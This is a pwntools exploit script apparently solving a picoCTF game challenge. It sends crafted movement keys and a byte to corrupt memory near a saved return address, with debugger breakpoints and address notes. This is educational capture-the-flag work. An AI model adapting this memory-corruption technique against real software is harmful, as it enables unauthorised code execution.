#!/usr/bin/env python3

from pwn import *
import time

# ENV
PORT = 53822
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./game', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x080496EB
            b* move_player
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
p.send(b'l')
sleep(0.5)
p.send(b'\x7c')
sleep(0.5)

for i in range(47):
    p.send(b'd')
    sleep(0.5)

for i in range(5):
    p.send(b'w')
    sleep(0.5)

p.interactive()

# player = 0xff8af1e0
# map = 0xff8af1f3
# saved rip = 0xff8af1cc